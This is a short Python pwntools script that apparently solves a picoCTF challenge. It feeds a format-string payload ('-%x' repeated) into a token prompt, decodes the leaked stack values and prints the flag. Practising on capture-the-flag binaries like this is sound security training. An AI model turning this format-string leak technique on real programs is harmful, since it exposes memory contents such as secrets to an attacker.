#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln', checksec = False)

p = process(exe.path)
# p = remote('mercury.picoctf.net', 53437)

p.sendlineafter(b'portfolio\n', b'1')

payload = str("-%x"*40).encode()
p.sendlineafter(b'token?\n', payload)

p.recvuntil(b'token:\n')
res = p.recvuntil('\n')
res = res[:-1].decode()
flag = ""
for index in res.split("-"):
    if len(index) == 8:
        a = bytearray.fromhex(index)
        for b in reversed(a):
            if b > 32 and b < 128:
                flag += chr(b)

print(flag)
p.interactive()